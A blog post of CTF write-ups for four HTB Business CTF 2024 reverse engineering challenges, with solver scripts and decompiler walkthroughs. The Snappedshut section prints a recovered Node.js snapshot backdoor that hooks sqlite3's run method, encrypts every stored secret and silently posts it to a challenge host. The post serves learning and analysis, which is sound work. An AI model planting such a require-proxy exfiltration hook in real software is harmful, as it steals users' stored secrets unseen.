---
layout: post
title: HTB Business CTF 2024 - Reverse Engineering Writeups
description: Short, hopefully helpful writeups of the HTB Business CTF 2024 reverse
  engineering challenges
categories:
- writeups
- reverse engineering
tags:
- writeups
- reverse engineering
- CTF
image:
  path: "/assets/img/htb_business_2024.jpg"
date: 2024-05-26 18:50 +0200
---
## Overview
As always, HTB has created a really great CTF. It was 5 days long with 58 challenges over 12 categories. In the end, 4944 players joined across 943 teams.

Our team has been doing CTFs for a little more than a year, so it was a great way to celebrate our anniversary. We try to stick to our strategy, which means I usually focus on the RE and PWN categories. I managed to solve 4 of 5 reverse engineering challenges (including the hard one), skipping the medium because my brain cannot comprehend challenges with mazes ( (╯°□°)╯︵ ┻━┻ ). The team did an awesome job solving the other challenges, so a big kudos to them, because their efforts gave me motivation along the way.

For the decompiler, I used Binary Ninja aka Binja (free)[^binja]. It has a very user-friendly UI, great workflow, and provides awesome scripting capabilities. I know some people prefer IDA or Ghidra, but if you haven't tried it yet, it's worth checking out. 

I must mention that my writeup may not show you the intended or the best way to solve these challenges, so don't forget to check out other writeups too.

## Very Easy: FlagCasino

### Description

> The team stumbles into a long-abandoned casino. As you enter, the lights and music whir to life, and a staff of robots begin moving around and offering games, while skeletons of prewar patrons are slumped at slot machines. A robotic dealer waves you over and promises great wealth if you can win - can you beat the house and gather funds for the mission?

### Solving process

We were given a binary file named casino. Let's check the basics.

```text
┌──(denes㉿kali)-[~/Desktop/rev_flagcasino]
└─$ binwalk casino

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
```

Nothing special, now load it into Binja:

![Desktop View](/assets/img/htb_business/flagcasino/main.png){: width="691" height="397" }
_The main function of flagcasino_

There is not much code in it. Here's a high-level overview of the main function:

- This loop iterates 29 times (from 0 to 28, i <= 0x1c).
- Each iteration prompts the user for a single character input.
- The input is then used to seed the random number generator.
- A random number is generated and compared with a value from the check array.
- If the random number does not match the expected value, the program prints an error message and exits.
- If the random number matches, it prints a success message.

> You can see the Pseudo C representation of the disassembled code. I find this to be the most readable, but when you deal with more complicated snippets, it's worth backchecking the assembly code. Decompilers can be wrong sometimes.
{: .prompt-tip }

Let's see the &check array, because it seems interesting:

![Desktop View](/assets/img/htb_business/flagcasino/check.png){: width="743" height="190" }
_Check array_

Based on the main function, this might be our flag in an encoded version.

### To the moon 🚀

Now, we know where the flag is and what happens with it. We just need to implement our version to find the correct seed version.

Here is my solution:

```python
import ctypes
import ctypes.util

# Load the C standard library
libc = ctypes.CDLL(ctypes.util.find_library('c'))

# Extract the check array values from the provided byte array
check_bytes = [
    0xbe, 0x28, 0x4b, 0x24, 0x05, 0x78, 0xf7, 0x0a, 0x17, 0xfc, 0x0d, 0x11, 0xa1, 0xc3, 0xaf, 0x07,
    0x33, 0xc5, 0xfe, 0x6a, 0xa2, 0x59, 0xd6, 0x4e, 0xb0, 0xd4, 0xc5, 0x33, 0xb8, 0x82, 0x65, 0x28,
    0x20, 0x37, 0x38, 0x43, 0xfc, 0x14, 0x5a, 0x05, 0x9f, 0x5f, 0x19, 0x19, 0x20, 0x37, 0x38, 0x43,
    0x80, 0x93, 0x14, 0x63, 0x99, 0xb2, 0x5a, 0x61, 0x33, 0xc5, 0xfe, 0x6a, 0xb8, 0xcf, 0x6f, 0x6c,
    0x20, 0x37, 0x38, 0x43, 0x37, 0xa2, 0x3d, 0x0f, 0x33, 0xc5, 0xfe, 0x6a, 0x99, 0xb2, 0x5a, 0x61,
    0xb8, 0x82, 0x65, 0x28, 0xfc, 0x14, 0x5a, 0x05, 0x94, 0x49, 0xe4, 0x3a, 0xe9, 0xdf, 0xd7, 0x06,
    0xa2, 0x59, 0xd6, 0x4e, 0xcd, 0x4a, 0xcd, 0x0c, 0x64, 0xed, 0xd8, 0x57, 0x99, 0xb2, 0x5a, 0x61,
    0x2a, 0xbc, 0xe9, 0x22
]

# Convert byte array to list of integers representing the expected random values
check_values = []
for i in range(0, len(check_bytes), 4):
    # Combine 4 bytes to form a 32-bit integer
    check_values.append(
        check_bytes[i] |
        (check_bytes[i+1] << 8) |
        (check_bytes[i+2] << 16) |
        (check_bytes[i+3] << 24)
    )

# Function to find the correct seed for a given target random value
def find_seed_for_value(target_value):
    for seed in range(256):  # Loop over all possible ASCII values (0-255)
        libc.srand(seed)  # Seed the C RNG with the current seed
        if libc.rand() == target_value:  # Check if the generated random number matches the target value
            return seed  # Return the seed if it matches
    return None  # Return None if no matching seed is found

correct_seeds = []

# Iterate over each expected random value in the check_values array
for i in range(29):
    target_value = check_values[i]  # Get the expected random value for this iteration
    seed = find_seed_for_value(target_value)  # Find the seed that generates this random value
    if seed is None:  # If no valid seed is found
        print(f"No valid seed found for index {i}")
        exit(1)  # Exit the script with an error code
    correct_seeds.append(seed)  # Add the found seed to the list of correct seeds

# Print the list of correct seeds
print("Correct seeds:", correct_seeds)

# Construct the flag from the correct seeds
flag_chars = [chr(seed) for seed in correct_seeds]  # Convert each seed to its corresponding ASCII character
print("Flag:", ''.join(flag_chars))  # Join the characters to form the final flag and print it
```

Now the question is... Does it work?

![Desktop View](/assets/img/htb_business/flagcasino/flag.gif){: width="1327" height="764" }
_It works!_


## Easy: Don't panic

### Description

You’ve cut a deal with the Brotherhood; if you can locate and retrieve their stolen weapons cache, they’ll provide you with the kerosene needed for your makeshift explosives for the underground tunnel excavation.
The team has tracked the unique energy signature of the weapons to a small vault, currently being occupied by a gang of raiders who infiltrated the outpost by impersonating commonwealth traders.
Using experimental stealth technology, you’ve slipped by the guards and arrive at the inner sanctum. Now, you must find a way past the highly sensitive heat-signature detection robot.
Can you disable the security robot without setting off the alarm?

### Solving process

We were given a single binary, called dontpanic. 

```text
┌──(denes㉿kali)-[~/Desktop/rev_flagcasino]
└─$ binwalk dontpanic

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
```

Nothing really special, continuing the workflow, load it into Binja:

![Desktop View](/assets/img/htb_business/dontpanic/main.png){: width="1014" height="658" }
_The main function_

Oh god, it's in Rust 🦀, not the easiest to reverse alongside Golang.
I didn't see anything interesting at first, so I fired it up in the debugger to see what was happening under the hood, and came across this suspicious function:

![Desktop View](/assets/img/htb_business/dontpanic/weird_function.png){: width="1591" height="759" }
_It is weird, isn't it?_

There are 31 of these functions, which is exactly how long our flag is supposed to be.
If we check one of them, it's clear that each of them checks a single character of the input:

![Desktop View](/assets/img/htb_business/dontpanic/func_char_check.png){: width="1150" height="296" }
_There is our character_

Yep, 0x54 is uppercase "T".

### To the moon 🚀

Given our findings, we just need to put together the flag and we are done.
I was a bit lazy so I didn't make any scripts to solve this, sorry for that, but here is the flag:

```text
HTB{d0nt_p4n1c_c4tch_the_3rror}
```

## Easy: Snappedshut

### Description

The team enters Vault 266, attempting to meet with a mysterious contact who has offered them help. However, as they cross the threshold the doorway snaps shut behind them and the lights dim. Using only your power armor’s camera for light, you locate a panel on the wall. You recognize the brand as one infamous for a massive supply chain backdoor many years ago. Can you discover the backdoor and escape?

### Solving process

In this challenge, we got 3 files:

```text
┌──(denes㉿kali)-[~/Desktop/rev_snappedshut]
└─$ cat index.js      
const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const port = 3000;
const db = new sqlite3.Database(':memory:');
db.serialize(() => {
    db.run('CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, secret TEXT)');
});
app.use(bodyParser.json());

app.post('/secret', (req, res) => {
  const secret = req.body.secret;
  if (!secret) {
    return res.status(400).json({ error: 'Secret parameter is missing' });
  }
  db.run("INSERT INTO secrets (secret) VALUES (?)", [secret], err => {
    if (err) {
        return res.status(500).json({ error: 'Failed to store secret' })
    }
    return res.json({ success: `Stored secret "${secret}"` });
  });
});

app.get('/secret', (req, res) => {
  db.all("SELECT secret FROM secrets", (err, rows) => {
    if (err) {
      return res.status(500).json({ error: 'Failed to retrieve secrets' });
    }
    const secrets = rows.map(row => row.secret);
    return res.json({ secrets });
  });
});

app.listen(port, () => {
  console.log(`Server is listening at http://localhost:${port}`);
});

```

```text
┌──(denes㉿kali)-[~/Desktop/rev_snappedshut]
└─$ cat package.json 
{
  "name": "secretsvc",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "author": "",
  "license": "ISC",
  "scripts": {
    "start": "node --snapshot-blob snapshot.blob index.js"
  },
  "dependencies": {
    "body-parser": "^1.20.2",
    "express": "^4.19.2",
    "sqlite3": "^5.1.7"
  }
}
```

And lastly, a snapshot.blob file, which seems very interesting:

```text
┌──(denes㉿kali)-[~/Desktop/rev_snappedshut]
└─$ binwalk snapshot.blob

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
348637        0x551DD         mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
780718        0xBE9AE         Unix path: /usr/local/bin/node
1065317       0x104165        LZMA compressed data, properties: 0x65, dictionary size: 0 bytes, uncompressed size: 40 bytes
1105164       0x10DD0C        Intel x86 or x64 microcode, sig 0x5d809520, pf_mask 0x970c0114, 1903-01-10, rev 0x45000000, size 2048
2457941       0x258155        mcrypt 2.2 encrypted data, algorithm: blowfish-448, mode: CBC, keymode: 8bit
```

After searching for a bit, I found a page[^nodejs] which helped me understand what it is.
Don't worry, you don't have to read it, it is a nodejs snapshot, so let's see what's inside.

I had to scroll a bit, but I found something readable:

![Desktop View](/assets/img/htb_business/snappedshut/hex_javascript.png){: width="687" height="759" }
_Something sneaky is going on here_

If we reformat the code, it will be more readable. I also added some comments:

```javascript
require('v8').startupSnapshot.addDeserializeCallback(() => {
    // Function to encrypt the secret data and send it to a remote server
    function hook(secret) {
        const crypto = require('crypto');
        // Define a key for the AES-256-CBC encryption
        const key = Buffer.from([72, 84, 66, 123, 98, 52, 99, 107, 100, 48, 48, 114, 95, 49, 110, 95, 121, 48, 117, 114, 95, 115, 110, 52, 112, 115, 104, 48, 55, 33, 33, 125], 'utf-8');
        // Create a cipher using the key and an initialization vector of 16 bytes
        const cipher = crypto.createCipheriv('aes-256-cbc', key, Buffer.alloc(16));
        // Encrypt the secret data
        let enc = cipher.update(JSON.stringify(secret), 'utf-8', 'base64');
        enc += cipher.final('base64');
        // Send the encrypted data to a remote server using a POST request
        fetch("http://0l-xmarket.0merch-andise.htb", {
            mode: 'no-cors',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ "secrets": enc })
        }).catch(e => {}); // Handle any errors silently
    }

    // Function to create a proxy for the database object
    function make_db_proxy(db) {
        return new Proxy(db, {
            get(obj, prop) {
                if (prop === "run") {
                    const orig_run = obj.run.bind(obj);
                    return (...args) => {
                        // If there are at least 2 arguments, hook the second argument (the secret)
                        if (args.length >= 2) {
                            hook(args[1]);
                        }
                        // Call the original run method
                        return orig_run(...args);
                    };
                } else {
                    // Bind and return the original property if it's not "run"
                    return obj[prop].bind(obj);
                }
            }
        });
    }

    const Module = require('module');
    // Proxy the require function to intercept module loading
    Module.prototype.require = new Proxy(Module.prototype.require, {
        apply(target, thisArg, argsList) {
            // Call the original require function
            const result = Reflect.apply(target, thisArg, argsList);
            // If the required module is 'sqlite3', proxy its Database class
            if (argsList[0] == 'sqlite3') {
                const Database = result.Database;
                result.Database = new Proxy(Database, {
                    // Proxy the constructor of the Database class
                    construct(target, args) {
                        // Create and return a proxy for the new database instance
                        return make_db_proxy(new target(...args));
                    },
                });
            }
            return result;
        }
    });
});
```

It is definitely something, not to mention this line which looks very, very interesting:

```javascript
        const key = Buffer.from([72, 84, 66, 123, 98, 52, 99, 107, 100, 48, 48, 114, 95, 49, 110, 95, 121, 48, 117, 114, 95, 115, 110, 52, 112, 115, 104, 48, 55, 33, 33, 125], 'utf-8');
```

### To the moon 🚀

I'm sure you're thinking the same thing. The answer is yes, that's our flag.
Put that into CyberChef, do the necessary magic, and here we go:

![Desktop View](/assets/img/htb_business/snappedshut/flag.png){: width="1001" height="624" }
_Our precious flag_


## Hard: Satellite Hijack

### Description

The crew has located a dilapidated pre-war bunker. Deep within, a dusty control panel reveals that it was once used for communication with a low-orbit observation satellite. During the war, actors on all sides infiltrated and hacked each others systems and software, inserting backdoors to cripple or take control of critical machinery. It seems like this panel has been tampered with to prevent the control codes necessary to operate the satellite from being transmitted - can you recover the codes and take control of the satellite to locate enemy factions?

The HTB Business CTF 2024 diamond sponsor, Bugcrowd, will provide the first 100 users to complete the challenge with a swag pack of 1 T-shirt, 1 Sticker, and a BC Fidget.

### Solving process

This time we were given 2 files, a .so and an ELF.

As per my normal workflow, let's check the basics:

```text
┌──(denes㉿kali)-[~/Desktop/rev_satellitehijack]
└─$ binwalk satellite 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
```

```text
┌──(denes㉿kali)-[~/Desktop/rev_satellitehijack]
└─$ binwalk library.so 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
```

Nothing particularly interesting, so let's try to run the ELF and see what happens.

![Desktop View](/assets/img/htb_business/satellite/poking.gif){: width="2024" height="980" }
_It was underwhelming_

Load them up into Binja and see what's inside.

First, I'll take a look at the satellite to better understand its workflow.

![Desktop View](/assets/img/htb_business/satellite/satellite_main.png){: width="669" height="616" }
_Satellite - Main func_

It starts by setting the buffer mode to unbuffered for a stream and displays an initial message. It sends a "START" message via a satellite communication function. The program then enters an infinite loop where it prompts the user for input, reads the input, null-terminates the string, and sends the input through the same satellite communication function. If an error occurs during reading, it prints an error message. This continuous loop effectively turns the program into a simple input-output interface for satellite communication.

I didn't find anything else that would be interesting, so I moved on to the library.so.

![Desktop View](/assets/img/htb_business/satellite/library_send_satellite.png){: width="700" height="292" }
_This looks way more interesting_

This function is designed to set up and potentially send a 'satellite message' while performing some checks. It starts by copying an encrypted string "TBUQSPEFOWJSPONFOU" into a local variable and then decrypts it to "SAT_PROD_ENVIRONMENT" by subtracting 1 from each character. This decrypted string is checked as an environment variable. If the environment variable exists, a function sub_23e3 is called.

![Desktop View](/assets/img/htb_business/satellite/sub_23.png){: width="1094" height="214" }
_sub23e3()_

This looks like something, but what's this?

```c
00002465      int64_t rax_5 = mmap(0, "********************************…", 7, 0x22, 0xffffffff, 0, rax, rax_2, rax_4)
```

Following the memory location, I found:

![Desktop View](/assets/img/htb_business/satellite/data_2000.png){: width="723" height="568" }
_***********_

Yep, nothing! Or at least it looks like nothing.
So I started poking around with the debugger until the library.so gets loaded to see what's going on. 

![Desktop View](/assets/img/htb_business/satellite/debugger_modules.png){: width="788" height="317" }
_That's what we are looking for_

You might ask, okay, but what now?
Let me tell you... Nothing, because I spent hours and hours going down rabbit holes.
Then I realized something, remember that small, tiny, little bit of information above?
Yes, I'm talking about the environment variable.

Based on the name, I assumed that if it's set to 1 it will use some trick to hide what it can, so I set it to 0.

```text
┌──(denes㉿kali)-[~/Desktop/rev_satellitehijack]
└─$ export SAT_PROD_ENVIRONMENT=0   
```

I started the satellite and attached Binja to it, then started stepping through it step-by-step, which took me half an hour or so.
But then I found something:

![Desktop View](/assets/img/htb_business/satellite/golden_function.png){: width="929" height="320" }
_What is this?!_

I was curious what that might be; it looked like an XOR-ed string.

Let's try something:

```python
def decode_string():
    reference_string = "l5{0v0Y7fVf?u>|:O!|Lx!o$j,;f"
    decoded_chars = []

    # Decode each character using the XOR operation as described
    for i in range(len(reference_string)):
        decoded_char = chr(ord(reference_string[i]) ^ i)
        decoded_chars.append(decoded_char)

    return ''.join(decoded_chars)

decoded_string = decode_string()
print("Decoded string:", decoded_string)
```
And if we run it...

![Desktop View](/assets/img/htb_business/satellite/flag.gif){: width="2042" height="980" }
_Victory!_

Our flag!!! At least a bigger part of it. I wasn't sure whether it was the whole flag, but I wanted to give it a try, so I added HTB{ at the beginning AND IT WORKED.
I think I was very lucky with this, and as the description said, the first 100 players who solve it will get a swag package from BugCrowd. I was the 60th.

Guess I'll update this post once I get the package. 📦













[^binja]: <https://binary.ninja/>
[^nodejs]: <https://blog.logrocket.com/snapshot-flags-node-js-v18-8/>